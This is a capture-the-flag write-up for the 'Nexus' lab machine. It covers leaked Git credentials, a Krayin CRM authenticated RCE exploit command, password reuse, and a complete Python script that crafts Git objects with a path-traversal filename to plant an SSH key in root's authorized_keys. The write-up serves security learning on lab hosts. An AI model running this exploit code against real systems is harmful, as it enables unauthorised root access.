+++
date = '2026-09-29T19:10:13+02:00'
draft = true
title = 'Nexus Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`29/09/2026`**

![pwn.png](/images/imgs_nexus/pwn.png)

---
# Introduction

**_Nexus_** is an **Easy-level Linux** box that features an interesting mix of credential reuse, authenticated web exploitation, and a challenging privilege escalation relying on **Git** internals.

Initial access is obtained by discovering exposed credentials within the commit history of a **Gitea** repository. These credentials grant access to a **Krayin CRM** instance, which is vulnerable to an **Authenticated Remote Code Execution**.

The privilege escalation requires lateral movement via **password reuse**, followed by the exploitation of a custom systemd timer. The associated **Python** script suffers from a **Path Traversal** vulnerability, which can be weaponized by manually crafting **Git** objects to overwrite the **root** user's **authorized_keys** file.

---
# Techniques Used

- **Information Disclosure (Git Commit History)**

- **Krayin CRM Authenticated RCE (CVE-2026-38526)**

- **Password Reuse**

- **Path Traversal via Git Internals Abuse**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -p- -vvv nexus.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp SSH

- **80**/tcp HTTP

## HTTP - Web Enumeration

I added **`nexus.htb`** to my **`/etc/hosts`** file and browsed to port **`80`**, which hosts the "**Nexus Energy Authority**" webpage.

![web1.png](/images/imgs_nexus/web1.png)

In the **`Careers -> View Role`** section, I found the hiring manager's email: **`j.matthew@nexus.htb`**.

![hr.png](/images/imgs_nexus/hr.png)

Running **gobuster** for directory brute-forcing didn't yield any interesting results. However, fuzzing for vhosts using **ffuf** revealed two active virtual hosts:

```bash
ffuf -u http://nexus.htb -H 'HOST: FUZZ.nexus.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -ac
```

![ffuf.png](/images/imgs_nexus/ffuf.png)

I added **`git.nexus.htb`** and **`billing.nexus.htb`** to my **`/etc/hosts`** file.

On **`git.nexus.htb`**, I found a **Gitea** instance (version **`1.26.0`**). By navigating to the **`Explore`** tab, I discovered an exposed repository: **`admin/krayin-docker-setup`**, which contained a **`.env`** file and a **`docker-compose.yml`**.

![git1.png](/images/imgs_nexus/git1.png)

I cloned the repository to my local machine, entered the hidden **`.git`** directory, and ran **`git show`**. Inside **`commit 9b817fa4e073d12fc43952acb09f3067b2f17adf`**, the **`DB_PASSWORD`** was exposed.

![git2.png](/images/imgs_nexus/git2.png)

---
# Initial Access | Krayin CRM RCE (CVE-2026-38526)

I used the discovered password along with the HR email (**`j.matthew@nexus.htb`**) to log into the **Krayin** platform on **`billing.nexus.htb`**.

![krayin.png](/images/imgs_nexus/krayin.png)

By clicking on the user avatar in the top-right corner, I noticed the software version was **`2.2.0`**.

![version.png](/images/imgs_nexus/version.png)

A quick search on **Exploit-DB** revealed a known vulnerability for this version: **`CVE-2026-38526`**.

![exp.png](/images/imgs_nexus/exp.png)

**Note**: _This is an **Authenticated Remote Code Execution** vulnerability affecting **Krayin CRM**. It leverages improper input validation or insecure file upload mechanisms within the authenticated dashboard. By providing valid credentials, an attacker can upload a malicious payload (e.g., a PHP file) that the backend subsequently executes, granting a shell in the context of the web server._

I downloaded the exploit, I grabbed a **PHP cmd** from [Online - Reverse Shell Generator](https://www.revshells.com/), and executed it:

```bash
python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f shell.php
```

![rce1.png](/images/imgs_nexus/rce1.png)

I visited the generated URL and executed the reverse shell payload within the webshell, receiving the connection on my **netcat** listener as the **`www-data`** user.

![rce2.png](/images/imgs_nexus/rce2.png)

![initial.png](/images/imgs_nexus/initial.png)

---
# Lateral Movement | Password Reuse → jonas

I checked **`/etc/passwd`** and identified **`jonas`** as the only standard user on the machine.

Initially, I tried standard **password reuse** with the credentials I already had, but it failed. I stabilized the shell and connected to the **MySQL** database using the credentials found inside the internal **`.env`** file:

![env.png](/images/imgs_nexus/env.png)

```bash
mysql -D krayin -u krayin -p
```

![db.png](/images/imgs_nexus/db.png)

However, I only found the hashed password for **`j.matthew`**, which I already had.
Taking a step back, I decided to simply test the **`.env`** password directly against the user **`jonas`** via **`su jonas`**.

![userf.png](/images/imgs_nexus/userf.png)

**User flag**.

---
# Privilege Escalation | Git Internals Abuse → root

After an extensive manual enumeration phase that yielded nothing, I transferred and executed **linpeas**.
While analyzing the output, one specific section caught my eye:

```text
══╣ Additional timer files: (T1053.003)                                                                
Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer                
  └─ RELATIVE_PATH: Uses relative path in Unit directive
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/gitea-template-sync.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive
```

I was re-reading the **linpeas** output for the third time, and the mention of a '**Potential privilege escalation in timer file**' kept catching my eye. I decided to investigate the service:

```bash
systemctl cat gitea-template-sync.service
```

![timer.png](/images/imgs_nexus/timer.png)

I analyzed **`/etc/gitea/template-sync.py`** with **Snyk**, which immediately flagged a **Path Traversal** vulnerability:

![snyk.jpeg](/images/imgs_nexus/snyk.jpeg)

```Python
target = os.path.join(stage_path, filepath)
target_dir = os.path.dirname(target)
```

**Note**: _The function **`os.path.join(stage_path, filepath)`** does not normalize the path nor neutralize **`..`** sequences. If **`filepath`** is attacker-controlled, a value like **`../../../../root/.ssh/authorized_keys`** makes the target resolve directly to **`/root/.ssh/authorized_keys`**. This allows **arbitrary file writes** as **root**._

## Not so Easy

To weaponize this, standard **Git clients** cannot be used since they sanitize file paths before committing. We must manually craft the **Git objects**. Since doing so requires a solid understanding of **Git's internal object** structure and writing custom code to bypass client sanitization, I relied on **AI** to help me build the following **Python** exploit script:

```Python
#!/usr/bin/env python3                                                                             
import os, hashlib, zlib, subprocess, shutil                                   
REPO_DIR  = "/tmp/fall-template"                                                                   
GITEA     = "localhost:3000"                                                                       
USER      = "jones"                                                                                
PASS      = "y27xb3ha!!74GbR"
REPO      = "fall-template"
SSH_KEY   = "/tmp/.exploit_key"
SSH_PUB   = "/tmp/.exploit_key.pub"
TRAVERSAL = "../../../../../../root/.ssh/authorized_keys"

# 1. SSH Key generation
if not os.path.exists(SSH_KEY):
    subprocess.run(["ssh-keygen","-t","ed25519","-f",SSH_KEY,"-N",""], check=True)
with open(SSH_PUB,"rb") as f:
    pubkey = f.read().strip() + b"\n"

# 2. Local Repo init
if os.path.exists(REPO_DIR):
    shutil.rmtree(REPO_DIR)
os.makedirs(REPO_DIR)
os.chdir(REPO_DIR)
subprocess.run(["git","init","-q","-b","main"], check=True)

obj_dir = ".git/objects"
os.makedirs(obj_dir, exist_ok=True)

def write_object(header, content):
    data = header + b"\0" + content
    sha  = hashlib.sha1(data).hexdigest()
    path = os.path.join(obj_dir, sha[:2], sha[2:])
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path,"wb") as f:
        f.write(zlib.compress(data))
    return sha

# 3. Blob creation
blob = pubkey
blob_sha = write_object(b"blob " + str(len(blob)).encode(), blob)

# 4. Tree creation with traversal name
entry = b"100644 " + TRAVERSAL.encode() + b"\0" + bytes.fromhex(blob_sha)
tree_sha = write_object(b"tree " + str(len(entry)).encode(), entry)

# 5. Commit
author = b"pwn <pwn@localhost> 0 +0000"
commit_content = (b"tree " + tree_sha.encode() + b"\n"
                  b"author " + author + b"\n"
                  b"committer " + author + b"\n\npwn\n")
commit_sha = write_object(b"commit " + str(len(commit_content)).encode(), commit_content)

# 6. Ref main
os.makedirs(".git/refs/heads", exist_ok=True)
with open(".git/refs/heads/main","w") as f:
    f.write(commit_sha + "\n")

# 7. Push
url = f"http://{USER}:{PASS}@{GITEA}/{USER}/{REPO}.git"
subprocess.run(["git","remote","add","origin",url], check=True)
subprocess.run(["git","push","-u","origin","main","--force"], check=True)

print(f"[+] blob={blob_sha[:7]} tree={tree_sha[:7]} commit={commit_sha[:7]}")
print("[+] push OK")
```

**Note**: _This script bypasses standard **Git** client restrictions by manually interacting with **Git's internal object** database. It creates a local repository, generates a **blob** containing our public **SSH key**, and crafts a **tree** object where the filename is explicitly set to the traversal payload. Once this crafted commit is forcefully pushed to the **Gitea** server, the vulnerable **`template-sync.py`** script pulls the repository. The flawed **`os.path.join()`** function concatenates the base path with our traversal string, writing the **SSH key** directly into the **root** user's **`authorized_keys`** file._

![priv1.png](/images/imgs_nexus/priv1.png)

After running the script, I simply logged in via **SSH** as **root** using the generated private key:

```bash
ssh -i /tmp/.exploit_key -o StrictHostKeyChecking=no root@localhost
```

![rootf.png](/images/imgs_nexus/rootf.png)

**Root flag**.

---
# Final Thoughts

I completely disagree with the **Easy** rating for this box.

While the machine itself doesn't require an excessive amount of steps, and the path to gaining a user shell is straightforward and intuitive, the privilege escalation is an entirely different beast.
Finding the vulnerability in the custom timer isn't obvious, understanding how the **Path Traversal** interacts with **Git** pulls is tricky, and successfully exploiting it is definitely hard. Since it requires a solid understanding of **Git's internal object** structure and the ability to write custom code to bypass standard client sanitization, leaning on **AI** to structure the payload was a necessity.

Overall, a great box that forces you to dig deep and learn new, advanced mechanics.

**Sources**:

- **Krayin CRM 2.2.0 RCE (CVE-2026-38526)** | https://www.exploit-db.com/exploits/52629

- **Git Internals - Objects** | https://git-scm.com/book/en/v2/Git-Internals-Git-Objects